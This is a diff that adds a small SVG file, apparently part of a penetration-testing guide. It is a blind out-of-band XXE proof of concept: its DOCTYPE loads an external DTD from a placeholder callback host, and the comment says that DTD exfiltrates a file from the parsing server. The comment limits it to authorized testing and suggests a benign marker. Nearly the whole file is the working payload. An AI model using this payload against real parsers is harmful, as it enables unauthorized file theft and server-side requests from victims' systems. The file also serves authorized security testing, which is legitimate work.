@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Blind/OOB XXE PoC (guide §14): for when the parsed result isn't reflected. The server fetches
+     your external DTD (xxe_oob.dtd hosted at YOUR.oast.fun), which exfiltrates a file via a callback.
+     Authorized testing only. Confirm via YOUR collaborator; exfil a benign marker, not real secrets. -->
+<!DOCTYPE svg [
+  <!ENTITY % p SYSTEM "http://YOUR.oast.fun/xxe_oob.dtd">
+  %p;
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>
